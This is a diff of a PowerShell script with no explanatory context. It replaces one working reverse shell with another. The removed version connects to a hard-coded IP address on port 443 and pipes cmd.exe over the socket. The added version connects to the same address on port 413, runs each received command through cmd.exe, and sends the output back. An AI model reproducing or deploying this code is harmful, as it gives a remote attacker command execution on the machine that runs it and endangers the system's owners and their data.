@@ -1,43 +1,54 @@
-powershell.exe function cleanup {
-if ($client.Connected -eq $true) {$client.Close()}
-if ($process.ExitCode -ne $null) {$process.Close()}
-exit}
-// Setup IPADDR
-$address = '198.211.113.157'
-// Setup PORT
-$port = '443'
-$client = New-Object system.net.sockets.tcpclient
-$client.connect($address,$port)
-$stream = $client.GetStream()
-$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
-$process = New-Object System.Diagnostics.Process
-$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
-$process.StartInfo.RedirectStandardInput = 1
-$process.StartInfo.RedirectStandardOutput = 1
-$process.StartInfo.UseShellExecute = 0
-$process.Start()
-$inputstream = $process.StandardInput
-$outputstream = $process.StandardOutput
-Start-Sleep 1
-$encoding = new-object System.Text.AsciiEncoding
-while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
-$stream.Write($encoding.GetBytes($out),0,$out.Length)
-$out = $null; $done = $false; $testing = 0;
-while (-not $done) {
-if ($client.Connected -ne $true) {cleanup}
-$pos = 0; $i = 1
-while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
-$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
-$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
-if ($pos -gt 0) {
-$string = $encoding.GetString($networkbuffer,0,$pos)
-$inputstream.write($string)
-start-sleep 1
-if ($process.ExitCode -ne $null) {cleanup}
-else {
-$out = $encoding.GetString($outputstream.Read())
-while($outputstream.Peek() -ne -1){
-$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
-$stream.Write($encoding.GetBytes($out),0,$out.length)
-$out = $null
-$string = $null}} else {cleanup}}
+$socket = new-object System.Net.Sockets.TcpClient('198.211.113.157', 413);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do
+{
+	$writer.Flush();
+	$read = $null;
+	$res = ""
+	while($stream.DataAvailable -or $read -eq $null) {
+		$read = $stream.Read($buffer, 0, 1024)
+	}
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+	if(!$out.equals("exit")){
+		$args = "";
+		if($out.IndexOf(' ') -gt -1){
+			$args = $out.substring($out.IndexOf(' ')+1);
+			$out = $out.substring(0,$out.IndexOf(' '));
+			if($args.split(' ').length -gt 1){
+                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+                $pinfo.FileName = "cmd.exe"
+                $pinfo.RedirectStandardError = $true
+                $pinfo.RedirectStandardOutput = $true
+                $pinfo.UseShellExecute = $false
+                $pinfo.Arguments = "/c $out $args"
+                $p = New-Object System.Diagnostics.Process
+                $p.StartInfo = $pinfo
+                $p.Start() | Out-Null
+                $p.WaitForExit()
+                $stdout = $p.StandardOutput.ReadToEnd()
+                $stderr = $p.StandardError.ReadToEnd()
+                if ($p.ExitCode -ne 0) {
+                    $res = $stderr
+                } else {
+                    $res = $stdout
+                }
+			}
+			else{
+				$res = (&"$out" "$args") | out-string;
+			}
+		}
+		else{
+			$res = (&"$out") | out-string;
+		}
+		if($res -ne $null){
+        $writer.WriteLine($res)
+    }
+	}
+}While (!$out.equals("exit"))
+$writer.close();
+$socket.close();
+$stream.Dispose()
